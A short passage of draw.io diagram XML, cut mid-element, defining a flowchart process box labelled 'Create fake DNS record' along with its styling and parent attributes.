          <mxGeometry relative="1" as="geometry" />
        </mxCell>
        <mxCell id="VL_DeuJodb9uclPqMyuw-8" value="&lt;div&gt;Create fake DNS record&lt;/div&gt;" style="shape=process;whiteSpace=wrap;html=1;backgroundOutline=1;" parent="1" vertex="1">
